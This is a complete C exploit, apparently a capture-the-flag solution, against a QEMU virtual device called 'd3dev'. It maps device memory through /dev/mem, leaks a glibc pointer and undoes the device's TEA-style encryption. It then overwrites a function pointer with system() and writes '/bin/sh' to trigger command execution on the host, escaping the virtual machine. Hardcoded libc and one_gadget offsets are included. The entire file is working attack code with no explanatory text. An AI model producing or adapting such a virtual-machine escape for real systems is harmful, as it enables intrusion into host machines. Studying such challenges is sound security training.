//musl-gcc exp.c -o exp --static -Os;strip -s exp;
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>

#define libc_system_offset 0x55410
#define libc_rand_r_offset 0x4aeb0
#define libc_binsh_offset  0x1b75aa
#define libc_rand_offset 0x4ae90
#define one_gadget_0_offset 0xe6e73
#define one_gadget_1_offset 0xe6e76
#define one_gadget_2_offset 0xe6e79

const uint32_t mmio_phy_base = 0xfebf1000;
const uint32_t mmio_mem_size = 0x800;
const uint32_t pmio_phy_base = 0xc040;
const uint32_t pmio_mem_size = 0x20;

const char sys_mem_file[] = "/dev/mem";
// /sys/devices/pci0000:00/0000:00:04.0/resource
const char cmd[] = "uname -a;whoami;ls;";

uint64_t mmio_mem = 0x0;
uint64_t pmio_mem = 0x0;

int die(const char *err_info){
    printf("[-] Exit with: %s\n.", err_info);
    exit(-1);
}

// ENCRYPT/DECRYPT
static void d3dev_encrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

static void d3dev_decrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<32; i++) {                         /* basic cycle start */
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;                                   
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}

void *mmap_file(const char *filename,uint32_t size,uint32_t offset){
    int fd = open(filename, O_RDWR | O_SYNC);
    if(fd<0){
        printf("[-] Can not open file: '%s'.\n", filename);
        die("OPEN ERROR!");
    }
    void *ptr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
    if(ptr == MAP_FAILED){
        printf("[-] Can not mmap file: '*%s'.\n", filename);
        die("MMAP ERROR!");
    }
    close(fd);
    return ptr;
}

void init_mmio(){
    mmio_mem = (uint64_t)mmap_file(sys_mem_file, mmio_mem_size, mmio_phy_base);
    printf("[+] Mmap mmio physical memory to [%p-%p].\n", (void *)mmio_mem, (void *)(mmio_mem+mmio_mem_size));
}

void init_pmio(){
    if(iopl(3)!=0){
        die("PMIO PERMISSION ERROR!");
    }
}

//mmio op
void mmio_write(uint64_t addr, uint64_t val){
    *(uint64_t *)(mmio_mem+addr) = val;
}

uint64_t mmio_read(uint64_t addr){
    return *(uint64_t *)(mmio_mem+addr);
}

//pmio op
void pmio_write(uint32_t addr, uint32_t val){
    outl(val, pmio_phy_base+addr);
}

uint32_t pmio_read(uint32_t addr){
    inl(pmio_phy_base+addr);
}




int main(){
    puts("[+] Exploit.");
    //init mmio & pmio
    init_mmio();
    init_pmio();
    
    //Step 1: Glibc address leak
    printf("[*] Set memory mode to 'RW'.\n");
    pmio_write(0x0, 1); // set memory mode RW

    printf("[*] CLR Key.\n");
    pmio_write(0x4, 0); // CLR key
    
    pmio_write(0x8, 0x100);
    printf("[*] Set block seek: %#x.\n", pmio_read(0x8));

    uint64_t glibc_randr;
    uint32_t key[4] = {0};

    //Step 2: Get system addr
    glibc_randr = mmio_read(0x18);
    d3dev_encrypt((uint32_t *)&glibc_randr, (uint32_t *)key);
    printf("[*] rand_r@glibc %#lx.\n", glibc_randr);

    uint64_t libc_base = glibc_randr - libc_rand_r_offset;
    uint64_t glibc_system = libc_base + libc_system_offset;

    printf("[+] Libc base: %#lx.\n", libc_base);
    printf("[+] system@glibc: %#lx.\n", glibc_system);
    
    //Step 3: Write ptr back
    uint64_t glibc_system_encrypt = glibc_system;
    d3dev_decrypt((uint32_t *)&glibc_system_encrypt, (uint32_t *)key);
    printf("[*] Overwrite rand_r ptr.\n");
    mmio_write(0x18, glibc_system_encrypt);

    //Step 4: Write cmd
    char cmd[9] = "/bin/sh\x00"; // 8 chars
    printf("[*] Load command: '%s'.\n", cmd);
    uint64_t cmd_encrypt = *(uint64_t *)cmd;
    d3dev_decrypt((uint32_t *)&cmd_encrypt, (uint32_t *)key);
    pmio_write(0x8, 0x0);
    printf("[*] Set block seek: %#x.\n", pmio_read(0x8));
    
    printf("[*] Write command.\n");
    mmio_write(0x0, cmd_encrypt);

    printf("[*] Result of `system('%s')`:\n", cmd);
    pmio_write(0x1c, 0x20202020); // 4 spaces padding

    return 0;
}
